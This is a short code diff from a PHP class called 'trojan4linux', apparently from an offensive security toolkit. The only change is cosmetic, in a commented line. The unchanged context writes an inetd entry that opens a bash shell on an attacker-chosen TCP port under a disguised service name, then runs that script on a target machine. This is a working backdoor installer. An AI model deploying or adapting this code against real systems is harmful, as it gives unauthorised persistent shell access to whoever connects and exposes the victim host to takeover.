@@ -29,7 +29,7 @@ class trojan4linux extends inject4linux{
          */
         $this->article("Test","Pick an obscure service from /etc/services associated with a tcp port 1024 and above…for example laplink");
         $this->requette("echo \"laplink $this->attacker_port/tcp # laplink\nlaplink stream tcp nowait /bin/sh bash -i\nrestart inetd.conf\nkillall -HUP inetd\" > $this->file_path");
-        //$victime = new vm($this->target_vmx_name);
+        //$victime = new VM($this->target_vmx_name);
         //$victime->vm2upload($this->file_path, "$this->vm_tmp_lin/$this->file_ext");
         $this->cmd($this->target_ip,"bash $this->vm_tmp_lin/$this->file_ext");
         //$this->
